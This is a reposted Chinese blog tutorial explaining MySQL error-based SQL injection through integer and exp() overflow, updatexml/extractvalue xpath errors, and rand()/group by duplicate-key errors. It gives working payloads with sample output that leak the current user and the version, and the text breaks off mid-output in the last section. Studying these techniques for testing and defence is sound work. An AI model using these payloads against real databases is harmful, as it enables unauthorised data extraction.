---
title: "[转] Mysql注入后利用"
date: 2018-01-06 01:33:18
tags: [mysql,sql,injection]
---

SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。

MYSQL报错注入个人认为大体可以分为以下几类：

1. BIGINT等数据类型溢出
2. xpath语法错误
3. concat+rand()+group_by()导致主键重复
4. 一些特性

下面就针对这几种错误类型看看背后的原理是怎样的。

<!--more-->

## 0x01 数据溢出

这里可以看到mysql是怎么处理整形的：[Integer Types (Exact Value)](https://dev.mysql.com/doc/refman/5.5/en/integer-types.html)，如下表：

![img](https://edu.aqniu.com/files/default/2017/03-08/142134e6bab6545212.jpg)

在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明[out-of-range-and-overflow](https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html)，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：

```Bash
mysql> select 18446744073709551615+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
```

在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：

```Mysql
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select ~0+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'
```

我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：

```Mysql
mysql> select (select * from (select user())x);
+----------------------------------+
| (select * from (select user())x) |
+----------------------------------+
| root@localhost                   |
+----------------------------------+
1 row in set (0.00 sec)

mysql> select !(select * from (select user())x);
+-----------------------------------+
| !(select * from (select user())x) |
+-----------------------------------+
|                                 1 |
+-----------------------------------+
1 row in set (0.01 sec)

mysql> select !(select * from (select user())x)+1;
+-------------------------------------+
| !(select * from (select user())x)+1 |
+-------------------------------------+
|                                   2 |
+-------------------------------------+
1 row in set (0.00 sec)
```

同理，利用exp函数也会产生类似的溢出错误：

```Mysql
mysql> select exp(709);
+-----------------------+
| exp(709)              |
+-----------------------+
| 8.218407461554972e307 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
```

注入姿势：

```Mysql
mysql> select exp(~(select*from(select user())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
```

利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：

```Mysql
mysql> select (select(!x-~0)from(select(select user())x)a);
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
```

而在mysql>5.5.53时，则不能返回查询结果

```Mysql
mysql> select (select(!x-~0)from(select(select user())x)a);
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not(`a`.`x`)) - ~(0))'
```

此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：

```Mysql
/* Max length of a error message. Should be
kept in sync with MYSQL_ERRMSG_SIZE. */

#define ERRMSGSIZE (512)
```

## 0x02 xpath语法错误

从mysql5.1.5开始提供两个[XML查询和修改的函数](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html)，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:

```Mysql
mysql> select extractvalue(1,'/a/b');
+------------------------+
| extractvalue(1,'/a/b') |
+------------------------+
|                        |
+------------------------+
1 row in set (0.01 sec)
```

它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：

```Mysql
mysql> select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'
mysql> select extractvalue(1,concat(0x7e,(select @@version),0x7e));
ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'
```

## 0x03 主键重复

这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：

```Mysql
mysql> select count(*) from test group by concat(version(),floor(rand(0)*2));
ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'
```

可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：

```mysql
mysql> select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'
```

这种报错方法的本质是因为`floor(rand(0)*2)`的重复性，导致group by语句出错。`group by key`的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：

```mysql
mysql> select * from test;
+------+-------+
| id   | name  |
+------+-------+
| 0    | jack  |
| 1    | jack  |
| 2    | tom   |
| 3    | candy |
| 4    | tommy |
| 5    | jerry |
+------+-------+
6 rows in set (0.00 sec)
```

我们以`select count(*) from test group by name`语句说明大致过程如下：

- 先是建立虚拟表，其中key为主键，不可重复：

| key  | count(*) |
| ---- | -------- |
|      |          |

- 开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1：

| key  | count(*) |
| ---- | -------- |
| jack | 1        |

| key  | count(*) |
| ---- | -------- |
| jack | 1+1      |

| key  | count(*) |
| ---- | -------- |
| jack | 1+1      |
| tom  | 1        |

| key   | count(*) |
| ----- | -------- |
| jack  | 1+1      |
| tom   | 1        |
| candy | 1        |

当这个操作遇到rand(0)*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)：

```mysql
mysql> select rand(0) from test;
+---------------------+
| rand(0)             |
+---------------------+
| 0.15522042769493574 |
|   0.620881741513388 |
|  0.6387474552157777 |
| 0.33109208227236947 |
|  0.7392180764481594 |
|  0.7028141661573334 |
+---------------------+
6 rows in set (0.00 sec)

mysql> select rand(0) from test;
+---------------------+
| rand(0)             |
+---------------------+
| 0.15522042769493574 |
|   0.620881741513388 |
|  0.6387474552157777 |
| 0.33109208227236947 |
|  0.7392180764481594 |
|  0.7028141661573334 |
+---------------------+
6 rows in set (0.00 sec)
```

同理，floor(rand(0)*2)则会固定得到011011...的序列(这个很重要)：

```mysql
mysql> select floor(rand(0)*2) from test;
+------------------+
| floor(rand(0)*2) |
+-----------
```